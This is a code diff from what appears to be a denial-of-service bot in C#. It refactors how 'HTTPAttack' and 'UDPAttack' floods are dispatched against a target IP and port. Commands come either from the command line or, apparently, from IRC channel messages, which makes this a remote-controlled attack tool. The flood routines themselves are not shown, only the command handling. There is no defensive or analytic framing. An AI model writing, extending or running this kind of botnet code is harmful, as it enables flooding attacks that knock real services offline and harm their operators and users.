@@ -31,16 +31,16 @@ namespace Noah
             state.AttackCompleted += state_OnAttackCompletedCli;
             IAttack attack = null;
 
-            switch (args[0].ToLower())
+            switch (state.Attack.ToLower())
             {
                 case "tcp":
-                    attack = new HTTPAttack(state, args[1], state.Port);
+                    attack = new HTTPAttack(state, state.IP, state.Port);
                     break;
                 case "udp":
-                    attack = new UDPAttack(state, args[1], state.Port);
+                    attack = new UDPAttack(state, state.IP, state.Port);
                     break;
                 default:
-                    Console.WriteLine("Unknown protocol: " + args[0]);
+                    Console.WriteLine("Unknown protocol name " + state.Attack);
                     Environment.Exit(0);
                     break;
             }
@@ -87,13 +87,13 @@ namespace Noah
                         string[] args = message.Body.Split(' ');
                         state = new ArgumentParser(args).Parse();
                         IAttack attack = null;
-                        switch (args[1].ToLower())
+                        switch (state.Attack)
                         {
                             case "tcp":
-                                attack = new HTTPAttack(state, args[2], state.Port);
+                                attack = new HTTPAttack(state, state.IP, state.Port);
                                 break;
                             case "udp":
-                                attack = new UDPAttack(state, args[2], state.Port);
+                                attack = new UDPAttack(state, state.IP, state.Port);
                                 break;
                             default:
                                 client.SendPRIVMSG("Unknown protocol " + args[1], message.Channel);
